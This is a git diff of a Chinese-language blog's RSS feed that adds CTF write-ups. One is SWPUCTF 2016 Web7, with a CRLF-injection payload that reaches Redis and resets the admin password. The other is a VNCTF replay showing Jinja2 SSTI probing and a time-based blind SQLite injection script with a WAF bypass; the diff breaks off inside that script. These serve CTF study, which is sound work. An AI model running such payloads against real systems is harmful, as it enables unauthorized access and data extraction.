@@ -110,6 +110,11 @@
         <category>sqlע��</category>
         <category>jwt身份验证</category>
         <category>rc4</category>
+        <category>CRLF</category>
+        <category>任意文件读取</category>
+        <category>PDO堆叠注入</category>
+        <category>test</category>
+        <category>tag2</category>
         <item>
             <guid isPermalink="true">http://odiws.github.io/2025/03/02/PyCalX-1/</guid>
             <title>PyCalX_1</title>
@@ -477,6 +482,54 @@ check=1
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;这个 pearcmd 挺难写进去的&lt;/p&gt;
  ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2025/02/24/SWPUCTF-2016-Web7/</guid>
+            <title>[SWPUCTF_2016]Web7</title>
+            <link>http://odiws.github.io/2025/02/24/SWPUCTF-2016-Web7/</link>
+            <category>buuctf</category>
+            <category>CRLF</category>
+            <pubDate>Mon, 24 Feb 2025 21:22:28 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;swpuctf_2016web7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#swpuctf_2016web7&#34;&gt;#&lt;/a&gt; [SWPUCTF_2016]Web7&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502242123993.png&#34; alt=&#34;image-20250224212323881&#34;&gt;&lt;/p&gt;
+&lt;p&gt;进入就是这个，随便 aaa&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502242123477.png&#34; alt=&#34;image-20250224212344321&#34;&gt;&lt;/p&gt;
+&lt;p&gt;提示是 python2 的 urlopen 函数，就是 crlf 了，可以用 set admin admin 来设置 admin 的密码，&lt;/p&gt;
+&lt;p&gt;payload：（%0d%0a 就是回车键（回车换行））通过 urllib 注入 redis。修改 admin 密码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;submit：http://127.0.0.1%0d%0a%0d%0aset%20admin%20admin%0d%0aHost:%20127.0.0.1:6379
+login：admin
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502242125952.png&#34; alt=&#34;image-20250224212539675&#34;&gt;&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndW9rZXlhLmdpdGh1Yi5pby9wb3N0L3N3cHVjdGYtMjAxNndlYjd1cmxsaWItdG91LXpodS1ydS1zc3JmLw==&#34;&gt;https://guokeya.github.io/post/swpuctf-2016web7urllib-tou-zhu-ru-ssrf/&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2025/02/24/vnctf%E5%A4%8D%E7%8E%B0/</guid>
+            <title>vnctf复现</title>
+            <link>http://odiws.github.io/2025/02/24/vnctf%E5%A4%8D%E7%8E%B0/</link>
+            <category>buuctf</category>
+            <category>regexp注入</category>
+            <pubDate>Mon, 24 Feb 2025 18:45:06 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;vnctf比赛部分复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#vnctf比赛部分复现&#34;&gt;#&lt;/a&gt; vnctf 比赛部分复现&lt;/h2&gt;
+&lt;h3 id=&#34;web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web&#34;&gt;#&lt;/a&gt; web&lt;/h3&gt;
+&lt;h4 id=&#34;学生姓名登记系统&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#学生姓名登记系统&#34;&gt;#&lt;/a&gt; &lt;strong&gt;学生姓名登记系统&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502241847740.png&#34; alt=&#34;image-20250224184704613&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502241847726.png&#34; alt=&#34;image-20250224184716567&#34;&gt;&lt;/p&gt;
+&lt;p&gt;存在 ssti 漏洞&lt;/p&gt;
+&lt;p&gt;判断是否在同一行里面（这样便于进行 ssti，打继承链）可以利用 python 中 jinja2 的表达式不论什么表达式在渲染模板时回自动回显表达式的值，我可以利用这个分析是不是在同一行里面来进行渲染，&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;a:=5&amp;#125;&amp;#125;%0a&amp;#123;&amp;#123;print(a)&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果是的话就会有 5 出现&lt;/p&gt;
+&lt;p&gt;不是就是原话了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502241926409.png&#34; alt=&#34;image-20250224192605277&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现是同一行上进行的渲染&lt;/p&gt;
+&lt;p&gt;那已知这里是同一个上下文，直接打继承链就行了。&lt;/p&gt;
+&lt;figure class=&#34;highlight go&#34;&gt;&lt;figcaption data-lang=&#34;go&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;swig￼&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;0a&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;swig￼&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;0a&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;swig￼&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;0a&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;swig￼&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;0a&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;swig￼&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;0a&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;swig￼&lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;0a&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;swig￼&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;0a&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;swig￼&lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;0a&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;swig￼&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;0a&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;swig￼&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;a&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;swig￼&lt;span class=&#34;token number&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;0a&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;swig￼&lt;span class=&#34;token number&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;奶龙回家&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#奶龙回家&#34;&gt;#&lt;/a&gt; 奶龙回家&lt;/h4&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502241904429.png&#34; alt=&#34;image-20250224190405369&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502241904762.png&#34; alt=&#34;image-20250224190437721&#34;&gt;&lt;/p&gt;
+&lt;p&gt;waf，得用 /**/ 代替空格，使用 randomblob 来进行延时&lt;/p&gt;
+&lt;p&gt;最终脚本：&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;http://node.vnteam.cn:46017/login&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;500&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;low &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;high &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;high&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;high&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &#34;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&#39;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;when&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;select&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;usern&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ame&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;users&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&amp;#123;1&amp;#125;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;then&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;randomblob&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;500000&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;end&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&#34;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token comment&#34;&gt;# payload = &#34;-&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&#39;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;when&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;select&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sql&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sqlite_master&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&amp;#123;1&amp;#125;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;then&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;randomblob&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;300&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;000000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;end&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&#34;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; datas &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token string&#34;&gt;&#34;username&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;123&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token string&#34;&gt;&#34;password&#34;&lt;/span&gt;&lt;span class=&#34;token 